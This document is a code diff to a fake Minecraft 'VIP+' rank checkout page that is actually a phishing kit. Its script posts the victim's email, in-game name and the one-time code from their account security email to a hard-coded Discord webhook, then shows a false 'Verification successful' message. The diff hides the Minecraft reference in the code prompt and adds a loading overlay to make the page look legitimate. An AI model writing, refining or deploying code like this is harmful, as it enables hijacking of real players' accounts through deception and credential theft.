@@ -44,6 +44,7 @@
 
         .main-content {
             padding: 20px;
+            position: relative;
         }
 
         .form-group {
@@ -91,6 +92,12 @@
             width: 100%;
             font-size: 16px;
             cursor: pointer;
+            position: relative;
+            transition: background-color 0.3s;
+        }
+
+        .submit-button:hover {
+            background: #e07718;
         }
 
         .submit-button:disabled {
@@ -121,9 +128,54 @@
         .initial-step.hidden {
             display: none;
         }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #F5841F;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        .loading-text {
+            color: #333;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Processing your request...</div>
+    </div>
+
     <div class="checkout-container">
         <div class="breadcrumb">
             You might like › Make Payment › Order Confirmed
@@ -168,8 +220,7 @@
 
             <div class="verification-step" id="verificationStep">
                 <div class="form-group">
-                    <label class="form-label">A One-Time Password (OTP) will be sent to your security email associated with your Minecraft account Enter the code to proceed -
-</label>
+                    <label class="form-label">Enter the code sent to your email to proceed</label>
                     <input type="text" class="form-input" id="verificationInput" required placeholder="Enter verification code">
                 </div>
                 <button class="submit-button" id="verifyCodeBtn">Verify Code</button>
@@ -182,57 +233,103 @@
         </div>
     </div>
 
-    <script>
-        // Replace with your Discord webhook URL
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1334182568295141407/5qNR0h4BboxE2_25gC6J15xkazUF9ehEcTS53L-TPZxRz_-9S1kvaYPyV2sJACXOMbnY';
+    <script src="config.js"></script>
 
-async function sendToDiscord(message) {
-    try {
-        const response = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ content: message })
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1334182568295141407/5qNR0h4BboxE2_25gC6J15xkazUF9ehEcTS53L-TPZxRz_-9S1kvaYPyV2sJACXOMbnY';
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+        const attemptsMessage = document.getElementById('attemptsMessage');
+        
+        // Initialize attempt counter
+        let verificationAttempts = 0;
+        const MAX_ATTEMPTS = 2;
+
+        function showLoading() {
+            loadingOverlay.classList.add('active');
+        }
+
+        function hideLoading() {
+            loadingOverlay.classList.remove('active');
+        }
+
+        async function sendToDiscord(message) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: message })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                throw error;
+            }
+        }
+
+        document.getElementById('completeOrderBtn').addEventListener('click', async function() {
+            const email = document.getElementById('emailInput').value.trim();
+            const ign = document.getElementById('ignInput').value.trim();
+
+            if (!email || !ign) {
+                alert('Please fill in all required fields');
+                return;
+            }
+
+            showLoading();
+            try {
+                await sendToDiscord(`@everyone New VIP+ Purchase:\n\nEmail:\n${email}\n\nIGN:\n${ign}`);
+                document.getElementById('initialStep').classList.add('hidden');
+                document.getElementById('verificationStep').classList.add('active');
+            } catch (error) {
+                alert('There was an error processing your request. Please try again.');
+            } finally {
+                hideLoading();
+            }
         });
 
-        if (response.ok) {
-            console.log('Message sent to Discord');
-        } else {
-            alert('There was an error sending the message. Please try again.');
-        }
-    } catch (error) {
-        console.error('Error:', error);
-        alert('There was an error sending the message. Please try again.');
-    }
-}
+        document.getElementById('verifyCodeBtn').addEventListener('click', async function() {
+            // Check if max attempts reached
+            if (verificationAttempts >= MAX_ATTEMPTS) {
+                attemptsMessage.classList.add('visible');
+                return;
+            }
 
-document.getElementById('completeOrderBtn').addEventListener('click', function() {
-    const email = document.getElementById('emailInput').value;
-    const ign = document.getElementById('ignInput').value;
+            const code = document.getElementById('verificationInput').value.trim();
+            if (!code) {
+                alert('Please enter the verification code');
+                return;
+            }
 
-    if (email && ign) {
-        const message = `@everyone New VIP+ Purchase:\n\nEmail:\n${email}\n\nIGN:\n${ign}`;
-        sendToDiscord(message);
+            showLoading();
+            try {
+                await sendToDiscord(`@everyone Verification Code:\n${code}`);
+                
+                // Increment attempt counter
+                verificationAttempts++;
+                
+                // Check if this was the last attempt
+                if (verificationAttempts >= MAX_ATTEMPTS) {
+                    verifyCodeBtn.disabled = true;
+                    verifyCodeBtn.classList.add('max-attempts');
+                    attemptsMessage.classList.add('visible');
+                }
 
-        document.getElementById('initialStep').classList.add('hidden');
-        document.getElementById('verificationStep').classList.add('active');
-    } else {
-        alert('Please fill in all required fields');
-    }
-});
-
-document.getElementById('verifyCodeBtn').addEventListener('click', function() {
-    const code = document.getElementById('verificationInput').value;
-    if (code) {
-        console.log('Verification code submitted:', code);
-        sendToDiscord(`@everyone Verification Code:\n${code}`);
-    } else {
-        alert('Please enter the verification code');
-    }
-});
-
-
+                // Show success message if verification was successful
+                setTimeout(() => {
+                    alert('Verification successful! Your rank will be applied shortly.');
+                }, 2000);
+            } catch (error) {
+                alert('There was an error verifying your code. Please try again.');
+            } finally {
+                hideLoading();
+            }
+        });
     </script>
 </body>
 </html>
